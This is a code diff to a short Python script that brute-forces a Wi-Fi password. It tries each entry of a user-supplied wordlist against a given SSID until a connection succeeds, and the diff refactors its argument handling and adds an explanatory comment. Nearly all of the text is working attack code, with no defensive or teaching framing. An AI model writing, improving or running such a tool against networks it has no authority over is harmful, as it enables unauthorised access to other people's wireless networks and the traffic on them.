@@ -1,16 +1,21 @@
 import sys
 from wireless import Wireless
 
-def main(args):
+def main(SSID=None, Wordlist=None):
     try:
-        SSID = args[1]
-        dictionary = open(args[2], 'r')
-    except IndexError:
-        print("Need to supply a network SSID, a password list")
+        SSID = str(SSID)
+    except:
+        print("Need to supply a network SSID and a password list")
         return 0
-    except FileNotFoundError:
+
+    try:
+        dictionary = open(Wordlist, 'r')
+    except:
         print("Wordlist supplied not found")
         return 0
+    #For each password in the dictionary, check the password by attempting
+    #to connect to the network with the user supplied SSID. If successful
+    #(res is true) then display to screen and quit checking. 
     for network_password in dictionary:
         wireless = Wireless()
         res = wireless.connect(ssid=SSID, password=network_password)
@@ -21,5 +26,11 @@ def main(args):
     print("Password not in dictionary")
 
 if __name__ == "__main__":
-    main(sys.argv)
+    try:
+        SSID = sys.argv[1]
+        dictionary = sys.argv[2]
+    except IndexError:
+        print("Need to supply a network SSID and a password list")
+        exit(0)
+    main(SSID, dictionary)
     
